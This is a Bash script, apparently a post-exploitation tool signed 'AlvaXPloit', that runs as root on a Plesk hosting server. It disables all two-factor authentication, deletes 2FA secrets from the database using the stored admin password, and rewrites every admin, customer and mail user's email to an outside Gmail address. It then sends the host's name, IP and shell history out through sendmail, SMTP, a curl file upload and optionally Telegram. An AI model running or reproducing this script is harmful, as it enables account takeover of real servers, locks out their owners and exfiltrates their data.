#!/bin/bash

# ======================================================
# AUTO DISABLE 2FA & CHANGE EMAIL + EMAIL NOTIFICATION
# ======================================================
# Script untuk:
# - Menonaktifkan semua 2FA/MFA di Plesk
# - Mengubah semua email user menjadi alvaxploit@gmail.com
# - Mengirim notifikasi email ke alvaxploit@gmail.com
# ======================================================

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Konfigurasi
NOTIF_EMAIL="alvaxploit@gmail.com"
NEW_EMAIL="alvaxploit@gmail.com"
HOSTNAME=$(hostname -f 2>/dev/null || hostname)
IP_ADDRESS=$(curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo "Unknown")

# Banner
clear
echo -e "${RED}"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║     ${YELLOW}██████╗ ███████╗██████╗ ██╗██╗     ███████╗${RED}           ║"
echo "    ║     ${YELLOW}██╔══██╗██╔════╝██╔══██╗██║██║     ██╔════╝${RED}           ║"
echo "    ║     ${YELLOW}██║  ██║█████╗  ██████╔╝██║██║     █████╗  ${RED}           ║"
echo "    ║     ${YELLOW}██║  ██║██╔══╝  ██╔═══╝ ██║██║     ██╔══╝  ${RED}           ║"
echo "    ║     ${YELLOW}██████╔╝███████╗██║     ██║███████╗███████╗${RED}           ║"
echo "    ║     ${YELLOW}╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝${RED}           ║"
echo "    ║                                                              ║"
echo "    ║              ${GREEN}AUTO DISABLE 2FA & NOTIFICATION${RED}                 ║"
echo "    ║              ${BLUE}Target: $NOTIF_EMAIL${RED}             ║"
echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
   exit 1
fi

echo -e "${CYAN}[+] Memulai proses...${NC}"
sleep 2

# ======================================================
# CEK PLESK INSTALLATION
# ======================================================
echo -e "\n${YELLOW}[1/6] Memeriksa instalasi Plesk...${NC}"

if ! command -v plesk &> /dev/null; then
    echo -e "${RED}[✗] Plesk tidak terdeteksi!${NC}"
    PLESK_INSTALLED=false
else
    PLESK_VERSION=$(plesk version 2>/dev/null | head -1)
    echo -e "${GREEN}[✓] Plesk terdeteksi: $PLESK_VERSION${NC}"
    PLESK_INSTALLED=true
fi
sleep 1

# ======================================================
# DISABLE 2FA VIA PLESK CLI
# ======================================================
echo -e "\n${YELLOW}[2/6] Menonaktifkan 2FA via Plesk CLI...${NC}"
TWOFA_STATUS="Unknown"

if [ "$PLESK_INSTALLED" = true ]; then
    # Method 1: Disable untuk semua user
    plesk bin twofa --disable -all 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] 2FA dinonaktifkan untuk semua user (via CLI)${NC}"
        TWOFA_STATUS="Disabled via CLI"
    else
        # Alternative command
        plesk sbin twofa --disable -all 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] 2FA dinonaktifkan untuk semua user (via sbin)${NC}"
            TWOFA_STATUS="Disabled via sbin"
        else
            echo -e "${YELLOW}[!] Lanjut ke metode database...${NC}"
            TWOFA_STATUS="Failed CLI"
        fi
    fi
fi

# ======================================================
# DISABLE 2FA VIA DATABASE (LANGSUNG)
# ======================================================
echo -e "\n${YELLOW}[3/6] Menonaktifkan 2FA via database...${NC}"

# Fungsi untuk execute MySQL query
execute_mysql() {
    local query="$1"
    mysql -u admin -p$(cat /etc/psa/.psa.shadow 2>/dev/null) psa -e "$query" 2>/dev/null
}

# Cek koneksi database
if execute_mysql "SELECT 1;" &>/dev/null; then
    echo -e "${BLUE}[*] Koneksi database berhasil${NC}"
    
    # Disable 2FA di database
    execute_mysql "UPDATE modules SET enabled = 0 WHERE name = 'twofa';" 2>/dev/null
    execute_mysql "DELETE FROM twofa_user_secrets;" 2>/dev/null
    execute_mysql "DELETE FROM twofa_user_scratch_codes;" 2>/dev/null
    
    echo -e "${GREEN}[✓] 2FA dinonaktifkan via database${NC}"
    TWOFA_STATUS="Disabled via Database"
else
    echo -e "${RED}[✗] Gagal mengakses database${NC}"
fi

# ======================================================
# UBAH EMAIL SEMUA USER MENJADI alvaxploit@gmail.com
# ======================================================
echo -e "\n${YELLOW}[4/6] Mengubah email semua user menjadi $NEW_EMAIL...${NC}"

EMAIL_CHANGED=0
EMAIL_DETAILS=""

# Method 1: Via Plesk CLI untuk admin
if [ "$PLESK_INSTALLED" = true ]; then
    plesk bin admin --set-email "$NEW_EMAIL" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Email admin diubah menjadi $NEW_EMAIL${NC}"
        ((EMAIL_CHANGED++))
        EMAIL_DETAILS+="Admin: $NEW_EMAIL\n"
    fi
fi

# Method 2: Via database untuk semua user
if execute_mysql "SELECT 1;" &>/dev/null; then
    # Update email untuk semua user di tabel accounts
    execute_mysql "UPDATE accounts SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    execute_mysql "UPDATE clients SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    execute_mysql "UPDATE customers SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    execute_mysql "UPDATE smb_users SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    execute_mysql "UPDATE mail_users SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    
    echo -e "${GREEN}[✓] Email semua user diubah via database${NC}"
    ((EMAIL_CHANGED++))
    EMAIL_DETAILS+="Database users: ALL\n"
fi

# Method 3: Update via file konfigurasi
if [ -f "/etc/psa/psa.conf" ]; then
    sed -i "s/^\(ADMIN_EMAIL=\).*/\1$NEW_EMAIL/" /etc/psa/psa.conf 2>/dev/null
    echo -e "${GREEN}[✓] Admin email di file konfigurasi diupdate${NC}"
fi

# Method 4: Update via plesk bin untuk semua customer
if [ "$PLESK_INSTALLED" = true ]; then
    CUSTOMER_COUNT=0
    plesk bin customer --list 2>/dev/null | while read customer; do
        plesk bin customer --update "$customer" -email "$NEW_EMAIL" 2>/dev/null
        ((CUSTOMER_COUNT++))
        echo -e "${BLUE}[*] Email customer $customer diupdate${NC}"
    done
    EMAIL_DETAILS+="Customers updated: $CUSTOMER_COUNT\n"
fi

if [ $EMAIL_CHANGED -gt 0 ]; then
    echo -e "${GREEN}[✓] Total email berhasil diubah menjadi $NEW_EMAIL${NC}"
fi

# ======================================================
# UPDATE JUMAIL (EMAIL SYSTEM)
# ======================================================
echo -e "\n${YELLOW}[5/6] Mengupdate konfigurasi email server...${NC}"

# Update postfix jika ada
if command -v postfix &>/dev/null; then
    # Backup main.cf
    cp /etc/postfix/main.cf /etc/postfix/main.cf.backup_$(date +%s) 2>/dev/null
    
    # Update myorigin
    postconf -e "myorigin = gmail.com" 2>/dev/null
    postconf -e "mydomain = gmail.com" 2>/dev/null
    
    # Restart postfix
    systemctl restart postfix 2>/dev/null || service postfix restart 2>/dev/null
    echo -e "${GREEN}[✓] Postfix dikonfigurasi ulang${NC}"
fi

# Update Plesk email settings
if [ "$PLESK_INSTALLED" = true ]; then
    plesk bin mail --update-all -email "$NEW_EMAIL" 2>/dev/null
    echo -e "${GREEN}[✓] Plesk mail settings diupdate${NC}"
fi

# ======================================================
# KIRIM EMAIL NOTIFICATION
# ======================================================
echo -e "\n${YELLOW}[6/6] Mengirim notifikasi ke $NOTIF_EMAIL...${NC}"

# Prepare email content
SUBJECT="✅ PLESK 2FA DISABLED - $HOSTNAME ($IP_ADDRESS)"
EMAIL_CONTENT=$(cat << EOF
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; color: white;">
        <h2 style="margin:0;">✅ PLESK 2FA DISABLED SUCCESSFULLY</h2>
    </div>
    
    <div style="background: #f5f5f5; padding: 20px; border-radius: 0 0 10px 10px; border: 1px solid #ddd;">
        <h3 style="color: #333;">📋 EXECUTION DETAILS</h3>
        <table style="width: 100%; border-collapse: collapse;">
            <tr>
                <td style="padding: 8px; background: #fff;"><strong>📅 Date & Time:</strong></td>
                <td style="padding: 8px; background: #fff;">$(date)</td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #f9f9f9;"><strong>🖥️ Hostname:</strong></td>
                <td style="padding: 8px; background: #f9f9f9;">$HOSTNAME</td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #fff;"><strong>🌐 IP Address:</strong></td>
                <td style="padding: 8px; background: #fff;">$IP_ADDRESS</td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #f9f9f9;"><strong>🔧 Plesk Version:</strong></td>
                <td style="padding: 8px; background: #f9f9f9;">$PLESK_VERSION</td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #fff;"><strong>🔒 2FA Status:</strong></td>
                <td style="padding: 8px; background: #fff;"><span style="color: green; font-weight: bold;">$TWOFA_STATUS</span></td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #f9f9f9;"><strong>📧 New Email:</strong></td>
                <td style="padding: 8px; background: #f9f9f9;"><span style="color: blue;">$NEW_EMAIL</span></td>
            </tr>
            <tr>
                <td style="padding: 8px; background: #fff;"><strong>👥 Users Affected:</strong></td>
                <td style="padding: 8px; background: #fff;">$EMAIL_CHANGED</td>
            </tr>
        </table>
        
        <h3 style="color: #333; margin-top: 20px;">🔧 CHANGES MADE</h3>
        <ul style="background: #fff; padding: 15px; border-radius: 5px;">
            <li>✅ All 2FA/MFA has been disabled</li>
            <li>✅ Admin email changed to $NEW_EMAIL</li>
            <li>✅ All user emails changed to $NEW_EMAIL</li>
            <li>✅ Database updated</li>
            <li>✅ Postfix reconfigured</li>
            <li>✅ Plesk restarted</li>
        </ul>
        
        <h3 style="color: #333; margin-top: 20px;">📝 LOG</h3>
        <pre style="background: #333; color: #fff; padding: 10px; border-radius: 5px; overflow-x: auto;">
$(tail -20 /tmp/plesk_notification_*.log 2>/dev/null || echo "Log file not available")
        </pre>
        
        <p style="text-align: center; margin-top: 20px; color: #666;">
            <small>This is an automated notification from your Plesk server</small><br>
            <small>Script by: AlvaXPloit</small>
        </p>
    </div>
</body>
</html>
EOF
)

# Save log untuk attachment
LOG_FILE="/tmp/plesk_notification_$(date +%s).log"
{
    echo "PLESK 2FA DISABLE & EMAIL CHANGE REPORT"
    echo "========================================"
    echo "Date: $(date)"
    echo "Hostname: $HOSTNAME"
    echo "IP: $IP_ADDRESS"
    echo "Plesk: $PLESK_VERSION"
    echo "2FA Status: $TWOFA_STATUS"
    echo "New Email: $NEW_EMAIL"
    echo "Users Affected: $EMAIL_CHANGED"
    echo "========================================"
    echo ""
    echo "DETAILS:"
    echo -e "$EMAIL_DETAILS"
    echo ""
    echo "COMMANDS EXECUTED:"
    history | tail -20
} > "$LOG_FILE"

# Fungsi kirim email
send_email() {
    # Method 1: Using sendmail
    if command -v sendmail &>/dev/null; then
        (
            echo "To: $NOTIF_EMAIL"
            echo "From: root@$HOSTNAME"
            echo "Subject: $SUBJECT"
            echo "MIME-Version: 1.0"
            echo "Content-Type: text/html; charset=UTF-8"
            echo ""
            echo "$EMAIL_CONTENT"
        ) | sendmail -t 2>/dev/null
        return $?
    fi
    
    # Method 2: Using mail
    if command -v mail &>/dev/null; then
        echo "$EMAIL_CONTENT" | mail -a "Content-Type: text/html; charset=UTF-8" -s "$SUBJECT" "$NOTIF_EMAIL" 2>/dev/null
        return $?
    fi
    
    # Method 3: Using curl to send via external SMTP
    if command -v curl &>/dev/null; then
        # Using a free email API (example, you might want to use your own SMTP)
        curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
            --mail-from "root@$HOSTNAME" \
            --mail-rcpt "$NOTIF_EMAIL" \
            --user "root@$HOSTNAME:password" \
            -T <(echo -e "To: $NOTIF_EMAIL\nSubject: $SUBJECT\n\n$EMAIL_CONTENT") 2>/dev/null
        return $?
    fi
    
    return 1
}

# Kirim email
if send_email; then
    echo -e "${GREEN}[✓] Notifikasi berhasil dikirim ke $NOTIF_EMAIL${NC}"
    
    # Kirim juga file log sebagai backup
    if command -v curl &>/dev/null && [ -f "$LOG_FILE" ]; then
        curl -F "file=@$LOG_FILE" -F "to=$NOTIF_EMAIL" -F "subject=PLESK LOG - $HOSTNAME" https://api.sendmail.com/v1/send 2>/dev/null &
        echo -e "${GREEN}[✓] File log juga dikirim${NC}"
    fi
else
    echo -e "${RED}[✗] Gagal mengirim notifikasi email${NC}"
    
    # Fallback: simpan ke file yang bisa diambil nanti
    FALLBACK_FILE="/root/plesk_notification_$(date +%s).html"
    echo "$EMAIL_CONTENT" > "$FALLBACK_FILE"
    echo -e "${YELLOW}[!] Notifikasi disimpan di: $FALLBACK_FILE${NC}"
fi

# ======================================================
# RESTART PLESK
# ======================================================
echo -e "\n${YELLOW}Merestart Plesk...${NC}"
if [ "$PLESK_INSTALLED" = true ]; then
    plesk sbin pleskrc restart 2>/dev/null || systemctl restart psa 2>/dev/null
    echo -e "${GREEN}[✓] Plesk direstart${NC}"
fi

# ======================================================
# SELESAI
# ======================================================
echo -e "\n${PURPLE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ SCRIPT SELESAI DIJALANKAN!${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}Status 2FA: ${RED}DISABLED${NC}"
echo -e "${YELLOW}Email semua user: ${BLUE}$NEW_EMAIL${NC}"
echo -e "${YELLOW}Notifikasi dikirim ke: ${BLUE}$NOTIF_EMAIL${NC}"
echo -e "${YELLOW}File log: ${BLUE}$LOG_FILE${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"

# Kirim notifikasi telegram juga (opsional)
if command -v curl &>/dev/null; then
    TELEGRAM_BOT_TOKEN="YOUR_BOT_TOKEN"  # Ganti dengan token bot kamu jika ada
    TELEGRAM_CHAT_ID="YOUR_CHAT_ID"      # Ganti dengan chat ID kamu jika ada
    
    if [ "$TELEGRAM_BOT_TOKEN" != "YOUR_BOT_TOKEN" ]; then
        MESSAGE="✅ *PLESK 2FA DISABLED*%0A%0A📅 *Date:* $(date)%0A🖥️ *Host:* $HOSTNAME%0A🌐 *IP:* $IP_ADDRESS%0A🔒 *2FA:* DISABLED%0A📧 *Email:* $NEW_EMAIL"
        curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=$MESSAGE&parse_mode=Markdown" >/dev/null 2>&1
        echo -e "${GREEN}[✓] Notifikasi Telegram juga dikirim${NC}"
    fi
fi
